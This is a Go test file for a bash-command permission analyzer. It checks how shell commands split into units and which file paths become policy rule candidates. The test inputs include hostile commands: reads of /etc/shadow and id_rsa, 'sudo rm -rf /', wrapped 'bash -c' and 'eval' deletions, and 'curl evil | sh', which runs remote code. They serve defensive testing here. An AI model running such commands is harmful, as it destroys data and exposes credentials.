package pi_permission_system

import (
	"reflect"
	"runtime"
	"strings"
	"testing"

	"github.com/MichaelKinsy/pigpen/pi-permission-system/bashanalysis"
	"github.com/MichaelKinsy/pigpen/pi-permission-system/bashparse"
)

const (
	cmdSubst  = bashparse.ContextCommandSubstitution
	procSubst = bashparse.ContextProcessSubstitution
	subshell  = bashparse.ContextSubshell
	opaque    = bashanalysis.WrapperOpaquePayload
	indirect  = bashanalysis.WrapperIndirection
	coreRead  = bashanalysis.FloorExemptionCoreReader
)

func TestBashProgramPathRuleCandidates(t *testing.T) {
	cwd := bpCwd

	// a token spelled from a HOME the program reassigns
	each(t, "leaves the path surface for %s", func(t *testing.T) {
		for _, command := range []string{
			`HOME=/etc; cat "$HOME/shadow"`,
			"HOME=/etc; cat ${HOME}/shadow",
			"HOME=/etc; cat ~/shadow",
		} {
			n := bpNormalizer(t, cwd)
			eqStrings(t, ruleTokens(bpParse(t, command, n)))
		}
	})
	tw(t, bpFile, "keeps a token spelled from a HOME nothing reassigns", func(t *testing.T) {
		n := bpNormalizer(t, cwd)
		eqStrings(t, ruleTokens(bpParse(t, `cat "$HOME/shadow"`, n)), join(homePath(), "shadow"))
	})

	// a redirect's target is projected by its role (#609)
	type ruleView struct {
		Token       string
		Effect      AttributedEffect
		MatchValues []string
	}
	ruleCandidatesOf := func(t *testing.T, command string) []ruleView {
		n := bpNormalizer(t, cwd)
		out := []ruleView{}
		for _, c := range bpParse(t, command, n).PathRuleCandidates() {
			out = append(out, ruleView{c.Token, c.Effect.Effect, c.Path.MatchValues()})
		}
		return out
	}
	eqRules := func(t *testing.T, got []ruleView, want ...ruleView) {
		t.Helper()
		if len(got) != len(want) {
			t.Fatalf("got %#v, want %#v", got, want)
		}
		for i := range got {
			if got[i].Token != want[i].Token || got[i].Effect != want[i].Effect {
				t.Fatalf("got %#v, want %#v", got, want)
			}
			eqStrings(t, got[i].MatchValues, want[i].MatchValues...)
		}
	}
	ruleTokensOf := func(t *testing.T, command string) []string {
		return ruleTokens(bpParse(t, command, bpNormalizer(t, cwd)))
	}

	tw(t, bpFile, "projects a bare output target that does not exist yet", func(t *testing.T) {
		eqRules(t, ruleCandidatesOf(t, "cat /etc/hosts > out.txt"),
			ruleView{"/etc/hosts", EffectRead, []string{"/etc/hosts"}},
			ruleView{"out.txt", EffectWrite, []string{join(cwd, "out.txt"), "out.txt"}})
	})
	tw(t, bpFile, "projects a bare input target that does not exist", func(t *testing.T) {
		eqRules(t, ruleCandidatesOf(t, "sort < in.txt"),
			ruleView{"in.txt", EffectRead, []string{join(cwd, "in.txt"), "in.txt"}})
	})
	tw(t, bpFile, "keeps only the literal value after a non-literal cd", func(t *testing.T) {
		eqRules(t, ruleCandidatesOf(t, `cd "$D" && echo hi > out.txt`),
			ruleView{"out.txt", EffectWrite, []string{"out.txt"}})
	})
	tw(t, bpFile, "does not admit the words the grammar appends after the target", func(t *testing.T) {
		// `-type` and `d` are `find`'s arguments; only `/dev/null` is the redirect's target (#977).
		eqStrings(t, ruleTokensOf(t, "find /usr 2>/dev/null -type d"), "/usr", "/dev/null")
	})
	tw(t, bpFile, "does not admit a target computed at run time", func(t *testing.T) {
		eqStrings(t, ruleTokensOf(t, `echo hi > "$OUT"`))
	})
	tw(t, bpFile, "does not admit a redirect the parse could not resolve", func(t *testing.T) {
		eqStrings(t, ruleTokensOf(t, "cat <> rw.txt"))
	})

	// operands of nested commands hosted in a redirect (#741)
	tw(t, bpFile, "projects the operand of a redirect-hosted command", func(t *testing.T) {
		eqStrings(t, ruleTokensOf(t, "echo hi > $(cat /etc/shadow)"), "/etc/shadow")
	})
	tw(t, bpFile, "does not promote a bare inner token that names nothing", func(t *testing.T) {
		eqStrings(t, ruleTokensOf(t, "echo hi > $(rm nonexistent-file)"))
	})

	// operands a statement names directly (#839)
	tw(t, bpFile, "projects a for loop's word-list operand", func(t *testing.T) {
		eqStrings(t, ruleTokensOf(t, "for f in /etc/shadow; do cat $f; done"), "/etc/shadow")
	})
	tw(t, bpFile, "projects a case subject", func(t *testing.T) {
		eqStrings(t, ruleTokensOf(t, "case /etc/shadow in a) echo b;; esac"), "/etc/shadow")
	})
	tw(t, bpFile, "leaves a case arm's pattern unprojected", func(t *testing.T) {
		// A `case` pattern is a glob matched against the subject string, not a path anything touches.
		eqStrings(t, ruleTokensOf(t, "case $x in /etc/passwd) echo b;; esac"))
	})
	tw(t, bpFile, "resolves a word-list operand against the effective directory", func(t *testing.T) {
		program := bpParse(t, "cd nested && for f in src/file.txt; do echo; done", bpNormalizer(t, cwd))
		eqStrings(t, mustRuleCandidate(t, program, "src/file.txt").Path.MatchValues(),
			"/projects/my-app/nested/src/file.txt", "nested/src/file.txt", "src/file.txt")
	})
	tw(t, bpFile, "attributes a statement operand as unproven", func(t *testing.T) {
		program := bpParse(t, "for f in /etc/shadow; do echo; done", bpNormalizer(t, cwd))
		got := program.PathRuleCandidates()
		if len(got) != 1 || got[0].Effect != UnprovenEffect {
			t.Errorf("got %#v", got)
		}
	})

	// operands of a command hosted in a prefix position (#742)
	each(t, "projects the operand of %s", func(t *testing.T) {
		for _, command := range []string{
			"$(cat /etc/shadow)", // a substitution as the whole command
			"`cat /etc/shadow`",  // a backtick substitution as the whole command
			"while $(cat /etc/shadow); do echo a; done",
			"if $(cat /etc/shadow); then echo a; fi",
			"until $(cat /etc/shadow); do echo a; done",
			"FOO=$(cat /etc/shadow) echo hi",
			"FOO=$(cat /etc/shadow) grep -f p x",
		} {
			if !contains(ruleTokensOf(t, command), "/etc/shadow") {
				t.Errorf("%q: /etc/shadow is not a rule candidate", command)
			}
		}
	})
	tw(t, bpFile, "leaves a prefix assignment's literal value unprojected", func(t *testing.T) {
		// The value is assigned, never accessed: only a hosted execution in that position runs.
		eqStrings(t, ruleTokensOf(t, "FOO=/etc/shadow echo hi"))
	})
	tw(t, bpFile, "projects an argument-position operand exactly as before", func(t *testing.T) {
		eqStrings(t, ruleTokensOf(t, "echo $(cat /etc/shadow)"), "/etc/shadow")
	})

	tw(t, bpFile, "adds absolute and relative policy values for relative tokens", func(t *testing.T) {
		candidates := bpParse(t, "cat src/foo.ts", bpNormalizer(t, cwd)).PathRuleCandidates()
		if len(candidates) != 1 || candidates[0].Token != "src/foo.ts" {
			t.Fatalf("got %#v", candidates)
		}
		eqStrings(t, candidates[0].Path.MatchValues(), "/projects/my-app/src/foo.ts", "src/foo.ts")
		eqv(t, candidates[0].Path.Value(), "/projects/my-app/src/foo.ts")
	})
	tw(t, bpFile, "resolves tokens after literal cd against the effective directory", func(t *testing.T) {
		program := bpParse(t, "cd nested && cat src/file.txt", bpNormalizer(t, cwd))
		c := mustRuleCandidate(t, program, "src/file.txt")
		eqStrings(t, c.Path.MatchValues(), "/projects/my-app/nested/src/file.txt", "nested/src/file.txt", "src/file.txt")
		eqv(t, c.Path.Value(), "/projects/my-app/nested/src/file.txt")
	})
	tw(t, bpFile, "adds the canonical alias for a symlinked token (#486)", func(t *testing.T) {
		n := bpNormalizer(t, cwd)
		// /projects/my-app/src/foo.ts is a symlink to /vault/foo.ts.
		mockRealpath(t, func(p string) (string, error) {
			if p == "/projects/my-app/src/foo.ts" {
				return "/vault/foo.ts", nil
			}
			return p, nil
		})
		candidate := bpParse(t, "cat src/foo.ts", n).PathRuleCandidates()[0]
		eqStrings(t, candidate.Path.MatchValues(), "/projects/my-app/src/foo.ts", "src/foo.ts", "/vault/foo.ts")
	})
	tw(t, bpFile, "does not absolute-allow relative tokens after unknown cd", func(t *testing.T) {
		program := bpParse(t, `cd "$DIR" && cat src/foo.ts`, bpNormalizer(t, cwd))
		c := mustRuleCandidate(t, program, "src/foo.ts")
		eqStrings(t, c.Path.MatchValues(), "src/foo.ts")
		eqv(t, c.Path.Value(), "src/foo.ts")
	})
	tw(t, bpFile, "keeps an unknown-cd token literal-only even when it would resolve a symlink (#393)", func(t *testing.T) {
		n := bpNormalizer(t, cwd)
		// A canonical alias here would resolve against the wrong (unknown) base.
		mockRealpath(t, func(string) (string, error) { return "/somewhere/else", nil })
		c := mustRuleCandidate(t, bpParse(t, `cd "$DIR" && cat src/foo.ts`, n), "src/foo.ts")
		eqStrings(t, c.Path.MatchValues(), "src/foo.ts")
		eqv(t, c.Path.BoundaryValue(), "")
	})

	// glob-bearing path tokens (#821)
	tw(t, bpFile, "projects a bracket glob in a relative token", func(t *testing.T) {
		eqStrings(t, ruleTokensOf(t, "cat src/[s]ecret.env"), "src/[s]ecret.env")
	})
	tw(t, bpFile, "projects a dot-star glob in an absolute token", func(t *testing.T) {
		eqStrings(t, ruleTokensOf(t, "rm -rf /tmp/tmp.*"), "/tmp/tmp.*")
	})

	// existence-probe bare-token promotion (#645): candidacy comes from the filesystem, so these run against a real tmpdir cwd.
	probe := func(t *testing.T) (string, *PathNormalizer) {
		t.Helper()
		root := realTmp(t)
		return root, NewPathNormalizer(PathFlavorForPlatform(runtime.GOOS), root)
	}
	tw(t, bpFile, "promotes a bare token naming an existing file", func(t *testing.T) {
		root, n := probe(t)
		writeFile(t, root, "id_rsa", "key")
		candidates := bpParse(t, "cat id_rsa", n).PathRuleCandidates()
		if len(candidates) != 1 || candidates[0].Token != "id_rsa" {
			t.Fatalf("got %#v", candidates)
		}
		eqStrings(t, candidates[0].Path.MatchValues(), join(root, "id_rsa"), "id_rsa")
	})
	tw(t, bpFile, "drops a bare token naming nothing \u2014 `git status` stays silent (#509)", func(t *testing.T) {
		_, n := probe(t)
		eqStrings(t, ruleTokens(bpParse(t, "git status", n)))
	})
	tw(t, bpFile, "drops every bare word of a command referencing no real file", func(t *testing.T) {
		_, n := probe(t)
		eqStrings(t, ruleTokens(bpParse(t, "npm run build && git checkout main", n)))
	})
	tw(t, bpFile, "promotes a bare symlink and carries its target as a match value", func(t *testing.T) {
		root, n := probe(t)
		// The issue's second repro shape: a_sym -> .some.secret, where the rule names the target.
		secret := writeFile(t, root, ".some.secret", "s3cret")
		symlink(t, root, "a_sym", secret)
		c := mustRuleCandidate(t, bpParse(t, "cat a_sym", n), "a_sym")
		if !contains(c.Path.MatchValues(), join(root, ".some.secret")) {
			t.Errorf("match values %q lack the target", c.Path.MatchValues())
		}
	})
	tw(t, bpFile, "promotes a bare token naming a directory", func(t *testing.T) {
		root, n := probe(t)
		mkSubdir(t, root, "vault")
		eqStrings(t, ruleTokens(bpParse(t, "ls vault", n)), "vault")
	})
	tw(t, bpFile, "promotes a dangling symlink \u2014 the link is the named operand", func(t *testing.T) {
		root, n := probe(t)
		symlink(t, root, "dangling", join(root, "gone"))
		eqStrings(t, ruleTokens(bpParse(t, "cat dangling", n)), "dangling")
	})
	tw(t, bpFile, "keeps a promoted token literal-only after an unknown cd (#393)", func(t *testing.T) {
		root, n := probe(t)
		writeFile(t, root, "id_rsa", "key")
		// An unknown base cannot be probed against a known directory, so the token stays unpromoted.
		eqStrings(t, ruleTokens(bpParse(t, `cd "$DIR" && cat id_rsa`, n)))
	})
	tw(t, bpFile, "does not make a revision range a rule candidate after an unknown cd", func(t *testing.T) {
		_, n := probe(t)
		eqStrings(t, ruleTokens(bpParse(t, "cd ~/x && git log v1..v2", n)), "~/x")
	})
	tw(t, bpFile, "does not double-promote a token the shape gate already accepts", func(t *testing.T) {
		root, n := probe(t)
		writeFile(t, root, "id_rsa", "key")
		if got := bpParse(t, "cat ./id_rsa", n).PathRuleCandidates(); len(got) != 1 {
			t.Errorf("got %d candidates", len(got))
		}
	})
	tw(t, bpFile, "probes a bare token against the effective directory after a literal cd", func(t *testing.T) {
		root, n := probe(t)
		nested := mkSubdir(t, root, "nested")
		writeFile(t, nested, "inner.txt", "x")
		c := mustRuleCandidate(t, bpParse(t, "cd nested && cat inner.txt", n), "inner.txt")
		if !contains(c.Path.MatchValues(), join(root, "nested", "inner.txt")) {
			t.Errorf("match values %q lack the nested path", c.Path.MatchValues())
		}
	})
	tw(t, bpFile, "consults no policy \u2014 promotion needs no matcher argument", func(t *testing.T) {
		root, n := probe(t)
		writeFile(t, root, "id_rsa", "key")
		eqStrings(t, ruleTokens(bpParse(t, "cat id_rsa", n)), "id_rsa")
	})

	// resolved shell expansions (#694)
	tw(t, bpFile, "resolves ${HOME}/\u2026 instead of fabricating a cwd-relative path", func(t *testing.T) {
		eqStrings(t, ruleTokensOf(t, `ls "${HOME}/somewhere"`), join(homePath(), "somewhere"))
	})
	tw(t, bpFile, "keeps a $PWD token literal-only after a non-literal cd", func(t *testing.T) {
		// `$PWD` becomes the base-relative `.`, so it inherits the #393 unknown-base treatment.
		program := bpParse(t, `cd "$DIR" && ls "$PWD/x"`, bpNormalizer(t, cwd))
		c := mustRuleCandidate(t, program, "./x")
		eqStrings(t, c.Path.MatchValues(), "./x")
		eqv(t, c.Path.BoundaryValue(), "")
	})
	tw(t, bpFile, "leaves a variable outside the resolvable set unresolved", func(t *testing.T) {
		eqStrings(t, ruleTokensOf(t, `ls "$CONFIG/x"`), "$CONFIG/x")
	})
}

func TestBashProgramCommands(t *testing.T) {
	cmds := func(t *testing.T, command string) *BashProgram {
		t.Helper()
		return bpParse(t, command, bpNormalizer(t, bpCwd))
	}

	tw(t, bpFile, "returns a single-element list for a lone command", func(t *testing.T) {
		eqCommands(t, cmds(t, "npm install pkg"), unit("npm install pkg"))
	})
	tw(t, bpFile, "splits an && chain", func(t *testing.T) {
		eqCommands(t, cmds(t, "cd /p && npm i x"), units("cd /p", "npm i x")...)
	})
	tw(t, bpFile, "splits || , ; and & separators", func(t *testing.T) {
		eqCommands(t, cmds(t, "a || b"), units("a", "b")...)
		eqCommands(t, cmds(t, "a ; b"), units("a", "b")...)
		eqCommands(t, cmds(t, "a & b"), units("a", "b")...)
	})
	tw(t, bpFile, "splits a pipeline into its commands", func(t *testing.T) {
		eqCommands(t, cmds(t, "cat f | grep b"), units("cat f", "grep b")...)
	})
	tw(t, bpFile, "splits newline-separated commands", func(t *testing.T) {
		eqCommands(t, cmds(t, "foo\nbar"), units("foo", "bar")...)
	})
	tw(t, bpFile, "does not split operators inside quotes", func(t *testing.T) {
		eqCommands(t, cmds(t, "echo 'x && y'"), unit("echo 'x && y'"))
	})
	tw(t, bpFile, "captures the command of a redirected statement without the redirect", func(t *testing.T) {
		eqCommands(t, cmds(t, "npm install > out.txt"), unit("npm install"))
	})

	// a redirect hosted inside the command
	each(t, "leaves the redirect out of %s", func(t *testing.T) {
		for _, row := range [][2]string{
			{"2>/dev/null git push --force", "git push --force"},
			{"FOO=1 2>/dev/null git push --force", "git push --force"},
			{"git <<< x push --force", "git push --force"},
			{"cat f <<< hi", "cat f"},
		} {
			eqCommands(t, cmds(t, row[0]), unit(row[1]))
		}
	})
	tw(t, bpFile, "reads the head word past a leading redirect", func(t *testing.T) {
		eqCommands(t, cmds(t, ">/dev/null bash -c 'rm -rf /tmp/x'"),
			BashCommand{Text: "bash -c 'rm -rf /tmp/x'", WrapperKind: opaque, ExecutedUnit: "rm -rf /tmp/x"})
	})
	tw(t, bpFile, "names what an indirection wrapper runs past a leading redirect", func(t *testing.T) {
		eqCommands(t, cmds(t, "2>/dev/null sudo rm -rf /"),
			BashCommand{Text: "sudo rm -rf /", WrapperKind: indirect, ExecutedUnit: "rm -rf /"})
	})

	// a redirect the grammar hung the command's words on
	each(t, "keeps the words of %s in its unit", func(t *testing.T) {
		for _, row := range [][2]string{
			{"git 2>/dev/null push --force", "git push --force"},
			{"git push 2>&1 --force", "git push --force"},
			{"grep pat 2>/dev/null f.txt", "grep pat f.txt"},
			{"cmd >&- arg", "cmd arg"},
		} {
			eqCommands(t, cmds(t, row[0]), unit(row[1]))
		}
	})
	tw(t, bpFile, "gives the words to the last command of a list", func(t *testing.T) {
		eqCommands(t, cmds(t, "cd a && git 2>/dev/null push --force"), units("cd a", "git push --force")...)
	})
	tw(t, bpFile, "names what an indirection wrapper runs from the words", func(t *testing.T) {
		eqCommands(t, cmds(t, "sudo 2>/dev/null rm -rf /"),
			BashCommand{Text: "sudo rm -rf /", WrapperKind: indirect, ExecutedUnit: "rm -rf /"})
	})

	// a heredoc the grammar hung the command's words on
	tw(t, bpFile, "keeps the words in the command's unit", func(t *testing.T) {
		eqCommands(t, cmds(t, "git <<EOF push --force\nb\nEOF"), unit("git push --force"))
	})
	tw(t, bpFile, "names what an indirection wrapper runs from the words", func(t *testing.T) {
		eqCommands(t, cmds(t, "sudo <<EOF rm -rf /\nb\nEOF"),
			BashCommand{Text: "sudo rm -rf /", WrapperKind: indirect, ExecutedUnit: "rm -rf /"})
	})

	// the rest of a heredoc's line
	each(t, "enumerates %s as its own unit", func(t *testing.T) {
		for _, line := range []string{"cat <<EOF | rm -rf /tmp/x", "cat <<EOF && rm -rf /tmp/x"} {
			eqCommands(t, cmds(t, line+"\nb\nEOF"), units("cat", "rm -rf /tmp/x")...)
		}
	})
	tw(t, bpFile, "enumerates every stage of a pipeline joined by `&&`", func(t *testing.T) {
		eqCommands(t, cmds(t, "cat <<EOF && ls | rm -rf /tmp/x\nb\nEOF"), units("cat", "ls", "rm -rf /tmp/x")...)
	})
	tw(t, bpFile, "keeps the operand a heredoc absorbed while enumerating its tail", func(t *testing.T) {
		// The first unit is the one this repo's project deny rule is spelled against (#941).
		eqCommands(t, cmds(t, "git commit -q -F - <<'EOF' && git log --oneline -1\nfeat: x\nEOF"),
			units("git commit -q -F", "git log --oneline -1")...)
	})
	xargsGrep := BashCommand{Text: "xargs grep foo", WrapperKind: indirect, ExecutedUnit: "grep foo"}
	tw(t, bpFile, "withholds the core-reader exemption when a tail redirect writes a file", func(t *testing.T) {
		eqCommands(t, cmds(t, "xargs grep foo <<EOF > /tmp/o\nb\nEOF"), xargsGrep)
	})
	tw(t, bpFile, "withholds it when a later command's redirect hangs off the heredoc's list", func(t *testing.T) {
		eqCommands(t, cmds(t, "xargs grep foo <<EOF && a > /tmp/o | b\nb\nEOF"), xargsGrep, unit("a"), unit("b"))
	})
	tw(t, bpFile, "withholds it when a redirect ends a pipeline joined after the heredoc", func(t *testing.T) {
		eqCommands(t, cmds(t, "xargs grep foo <<EOF && a | b | c > /tmp/o\nb\nEOF"), xargsGrep, unit("a"), unit("b"), unit("c"))
	})
	tw(t, bpFile, "withholds a wrapped reader's exemption once its argument's HOME is reassigned", func(t *testing.T) {
		eqCommands(t, cmds(t, `HOME=-delete; xargs find "$HOME"`),
			unit("HOME=-delete"),
			BashCommand{Text: `xargs find "$HOME"`, WrapperKind: indirect, ExecutedUnit: `find "$HOME"`})
	})
	tw(t, bpFile, "keeps the core-reader exemption when a tail redirect duplicates a descriptor", func(t *testing.T) {
		eqCommands(t, cmds(t, "xargs grep foo <<EOF >&2\nb\nEOF"),
			BashCommand{Text: "xargs grep foo", WrapperKind: indirect, ExecutedUnit: "grep foo", FloorExemption: coreRead})
	})
	tw(t, bpFile, "still enumerates a substitution in the heredoc's body", func(t *testing.T) {
		eqCommands(t, cmds(t, "cat <<EOF | tail\n$(rm e)\nEOF"), unit("cat"), ctxUnit("rm e", cmdSubst), unit("tail"))
	})

	// the unit text of a command with no hosted redirect
	tw(t, bpFile, "keeps the source spacing verbatim", func(t *testing.T) {
		command := "git  push \\\n  --force"
		eqCommands(t, cmds(t, command), unit(command))
	})
	tw(t, bpFile, "leaves out the operand a heredoc absorbs", func(t *testing.T) {
		// A project deny rule is spelled against this unit text (#941).
		eqCommands(t, cmds(t, "git commit -F - <<'EOF'\nfeat: x\nEOF"), unit("git commit -F"))
	})
	tw(t, bpFile, "keeps the operand a plain file argument supplies", func(t *testing.T) {
		eqCommands(t, cmds(t, "git commit -F /tmp/msg.txt"), unit("git commit -F /tmp/msg.txt"))
	})

	// commands hosted in a redirect target (#741)
	each(t, "descends into %s", func(t *testing.T) {
		for _, row := range [][3]string{
			{"echo hi > $(rm x)", "echo hi", "rm x"},
			{"echo hi >> $(rm b)", "echo hi", "rm b"},
			{"echo hi 2> `rm d`", "echo hi", "rm d"},
			{"echo hi &> $(rm q)", "echo hi", "rm q"},
		} {
			eqCommands(t, cmds(t, row[0]), unit(row[1]), ctxUnit(row[2], cmdSubst))
		}
	})
	tw(t, bpFile, "descends into a process substitution read as input", func(t *testing.T) {
		eqCommands(t, cmds(t, "cat < <(rm c)"), unit("cat"), ctxUnit("rm c", procSubst))
	})
	tw(t, bpFile, "descends into a substitution concatenated into the destination", func(t *testing.T) {
		eqCommands(t, cmds(t, "echo hi > ${DIR}/$(rm z)"), unit("echo hi"), ctxUnit("rm z", cmdSubst))
	})
	tw(t, bpFile, "descends into a redirect on a chained command", func(t *testing.T) {
		eqCommands(t, cmds(t, "cd /p && echo hi > $(rm x)"), unit("cd /p"), unit("echo hi"), ctxUnit("rm x", cmdSubst))
	})
	tw(t, bpFile, "leaves a plain redirect destination unenumerated", func(t *testing.T) {
		eqCommands(t, cmds(t, "echo hi > out.txt"), unit("echo hi"))
	})

	// commands hosted in a heredoc body (#741)
	tw(t, bpFile, "descends into an interpolating heredoc body", func(t *testing.T) {
		eqCommands(t, cmds(t, "cat <<EOF\n$(rm e)\nEOF"), unit("cat"), ctxUnit("rm e", cmdSubst))
	})
	each(t, "leaves a %s heredoc body literal, since it does not interpolate", func(t *testing.T) {
		for _, command := range []string{"cat <<'EOF'\n$(rm e)\nEOF", "cat <<\"EOF\"\n$(rm e)\nEOF"} {
			eqCommands(t, cmds(t, command), unit("cat"))
		}
	})
	tw(t, bpFile, "descends into a herestring substitution", func(t *testing.T) {
		eqCommands(t, cmds(t, "cat <<< $(rm x)"), unit("cat"), ctxUnit("rm x", cmdSubst))
	})
	tw(t, bpFile, "leaves a heredoc body carrying no substitution unenumerated", func(t *testing.T) {
		eqCommands(t, cmds(t, "cat <<EOF\nplain text\nEOF"), unit("cat"))
	})

	// commands hosted by a declaration, test, or assignment (#742)
	each(t, "descends into %s", func(t *testing.T) {
		for _, row := range [][2]string{
			{"local x=$(rm y)", "rm y"}, {"export X=$(rm x)", "rm x"}, {"declare x=$(rm y)", "rm y"},
			{"readonly Y=$(rm z)", "rm z"}, {"typeset q=$(rm w)", "rm w"}, {"[[ $(rm x) ]]", "rm x"},
			{"[ $(rm x) ]", "rm x"}, {"unset $(rm x)", "rm x"}, {"X=$(rm q)", "rm q"}, {"X=`rm q`", "rm q"},
		} {
			eqCommands(t, cmds(t, row[0]), unit(row[0]), ctxUnit(row[1], cmdSubst))
		}
	})
	tw(t, bpFile, "descends into a process substitution hosted by a declaration", func(t *testing.T) {
		eqCommands(t, cmds(t, "local f=<(rm y)"), unit("local f=<(rm y)"), ctxUnit("rm y", procSubst))
	})
	tw(t, bpFile, "leaves a declaration hosting no execution alone", func(t *testing.T) {
		eqCommands(t, cmds(t, "local x=1"), unit("local x=1"))
	})

	// an unparsed ERROR node (#742)
	each(t, "emits %s whole, taking nothing from inside it", func(t *testing.T) {
		type row struct {
			command, enclosing, blob string
			salvaged                 []BashCommand
		}
		for _, r := range []row{
			// The heredoc's line, salvaged without its heredoc; not its body.
			{"cat <<'EOF'\nsee `rm -rf x` here", "cat", "<<'EOF'\nsee `rm -rf x` here",
				[]BashCommand{{Text: "cat", ParseUnresolved: true, Salvaged: true}}},
			{`echo "$(rm x)`, "echo", `"$(rm x)`, nil},
		} {
			want := append([]BashCommand{unit(r.enclosing), {Text: r.blob, ParseUnresolved: true}}, r.salvaged...)
			eqCommands(t, cmds(t, r.command), want...)
		}
	})
	tw(t, bpFile, "emits an unterminated control-flow statement whole", func(t *testing.T) {
		eqCommands(t, cmds(t, "for f in a; do rm $f"), BashCommand{Text: "for f in a; do rm $f", ParseUnresolved: true})
	})

	// commands inside a for loop (#742)
	tw(t, bpFile, "emits the body's commands, but not the loop variable or word list", func(t *testing.T) {
		eqCommands(t, cmds(t, "for f in a b; do rm $f; done"), units("for f in a b; do rm $f; done", "rm $f")...)
	})
	tw(t, bpFile, "emits every command of a multi-statement body", func(t *testing.T) {
		eqCommands(t, cmds(t, "for f in a; do cd /t && rm $f; done"), units("for f in a; do cd /t && rm $f; done", "cd /t", "rm $f")...)
	})
	tw(t, bpFile, "descends into a substitution in the word list", func(t *testing.T) {
		eqCommands(t, cmds(t, "for f in $(rm x); do echo $f; done"),
			unit("for f in $(rm x); do echo $f; done"), ctxUnit("rm x", cmdSubst), unit("echo $f"))
	})

	// commands inside the remaining compound statements (#742)
	each(t, "descends into %s", func(t *testing.T) {
		for _, row := range []struct {
			command string
			inner   []string
		}{
			{"if true; then rm y; fi", []string{"true", "rm y"}},
			{"if true; then rm y; elif false; then rm z; else rm w; fi", []string{"true", "rm y", "false", "rm z", "rm w"}},
			{"while true; do rm y; done", []string{"true", "rm y"}},
			{"until true; do rm y; done", []string{"true", "rm y"}},
			{"select f in a b; do rm $f; done", []string{"rm $f"}},
			{"for ((i=0; i<3; i++)); do rm $i; done", []string{"i=0", "rm $i"}},
			{"case /etc/shadow in a) rm y;; b) rm z;; esac", []string{"rm y", "rm z"}},
			{"myfn() { rm y; }", []string{"{ rm y; }", "rm y"}},
			{"function myfn { rm y; }", []string{"{ rm y; }", "rm y"}},
			{"{ rm y; }", []string{"rm y"}},
			{"! rm y", []string{"rm y"}},
		} {
			eqCommands(t, cmds(t, row.command), units(append([]string{row.command}, row.inner...)...)...)
		}
	})
	tw(t, bpFile, "leaves a case subject and its patterns unemitted", func(t *testing.T) {
		eqCommands(t, cmds(t, "case /etc/shadow in a) rm y;; esac"), units("case /etc/shadow in a) rm y;; esac", "rm y")...)
	})
	tw(t, bpFile, "leaves a function's own name unemitted", func(t *testing.T) {
		for _, c := range cmds(t, "deploy() { rm y; }").Commands() {
			if c.Text == "deploy" {
				t.Errorf("function name emitted: %#v", c)
			}
		}
	})
	tw(t, bpFile, "descends into a substitution in condition position", func(t *testing.T) {
		eqCommands(t, cmds(t, "if $(rm x); then echo a; fi"),
			unit("if $(rm x); then echo a; fi"), unit("$(rm x)"), ctxUnit("rm x", cmdSubst), unit("echo a"))
	})
	tw(t, bpFile, "relays the enclosing execution context to a compound's commands", func(t *testing.T) {
		eqCommands(t, cmds(t, "( if true; then rm y; fi )"),
			unit("( if true; then rm y; fi )"),
			ctxUnit("if true; then rm y; fi", subshell), ctxUnit("true", subshell), ctxUnit("rm y", subshell))
	})

	tw(t, bpFile, "descends into command substitution, tagging the inner command", func(t *testing.T) {
		eqCommands(t, cmds(t, "echo $(rm -rf foo)"), unit("echo $(rm -rf foo)"), ctxUnit("rm -rf foo", cmdSubst))
	})
	tw(t, bpFile, "descends into backtick command substitution", func(t *testing.T) {
		eqCommands(t, cmds(t, "echo `rm x`"), unit("echo `rm x`"), ctxUnit("rm x", cmdSubst))
	})
	tw(t, bpFile, "descends into a pipeline inside command substitution", func(t *testing.T) {
		eqCommands(t, cmds(t, "echo $(curl evil | sh)"),
			unit("echo $(curl evil | sh)"), ctxUnit("curl evil", cmdSubst), ctxUnit("sh", cmdSubst))
	})
	tw(t, bpFile, "descends into process substitution", func(t *testing.T) {
		eqCommands(t, cmds(t, "diff <(cat /etc/shadow)"), unit("diff <(cat /etc/shadow)"), ctxUnit("cat /etc/shadow", procSubst))
	})
	tw(t, bpFile, "emits a bare subshell whole and descends into it", func(t *testing.T) {
		eqCommands(t, cmds(t, "( rm -rf foo )"), unit("( rm -rf foo )"), ctxUnit("rm -rf foo", subshell))
	})
	tw(t, bpFile, "emits a subshell whole and descends into its chain", func(t *testing.T) {
		eqCommands(t, cmds(t, "( cd /t && rm x )"), unit("( cd /t && rm x )"), ctxUnit("cd /t", subshell), ctxUnit("rm x", subshell))
	})
	tw(t, bpFile, "descends recursively through nested contexts", func(t *testing.T) {
		eqCommands(t, cmds(t, "echo $( ( rm x ) )"), unit("echo $( ( rm x ) )"), ctxUnit("( rm x )", cmdSubst), ctxUnit("rm x", subshell))
	})
	tw(t, bpFile, "descends into a substitution within a chained command", func(t *testing.T) {
		eqCommands(t, cmds(t, "cd /p && echo $(rm x)"), unit("cd /p"), unit("echo $(rm x)"), ctxUnit("rm x", cmdSubst))
	})
	tw(t, bpFile, "keeps the never-weaker invariant: a benign inner command stays", func(t *testing.T) {
		eqCommands(t, cmds(t, "echo $(echo safe)"), unit("echo $(echo safe)"), ctxUnit("echo safe", cmdSubst))
	})
	tw(t, bpFile, "returns an empty list for an empty or whitespace command", func(t *testing.T) {
		eqCommands(t, cmds(t, ""))
		eqCommands(t, cmds(t, "   "))
	})
	tw(t, bpFile, "strips a leading env-var assignment prefix", func(t *testing.T) {
		eqCommands(t, cmds(t, "AWS_PROFILE=prod aws ec2 terminate-instances --instance-ids i-1"),
			unit("aws ec2 terminate-instances --instance-ids i-1"))
	})
	tw(t, bpFile, "strips multiple leading env-var assignments", func(t *testing.T) {
		eqCommands(t, cmds(t, "A=1 B=2 aws s3 ls"), unit("aws s3 ls"))
	})
	tw(t, bpFile, "strips the env-var prefix of each command in a chain", func(t *testing.T) {
		eqCommands(t, cmds(t, "X=1 aws sts get-caller-identity && ls"), units("aws sts get-caller-identity", "ls")...)
	})
	tw(t, bpFile, "keeps a pure assignment with no command unchanged", func(t *testing.T) {
		eqCommands(t, cmds(t, "FOO=bar"), unit("FOO=bar"))
	})

	// opaque-payload wrappers
	each(t, "flags %s as opaque", func(t *testing.T) {
		for _, command := range []string{
			`bash -c "rm -rf /"`, `sh -c "rm -rf /"`, `dash -c "rm -rf /"`, `zsh -c "rm -rf /"`, `ksh -c "rm -rf /"`,
			`eval "rm -rf /"`, `/bin/bash -c "rm -rf /"`, `bash -ec "rm -rf /"`,
		} {
			eqCommands(t, cmds(t, command), BashCommand{Text: command, WrapperKind: opaque, ExecutedUnit: "rm -rf /"})
		}
	})
	tw(t, bpFile, "flags an env-prefixed wrapper as opaque after stripping the prefix", func(t *testing.T) {
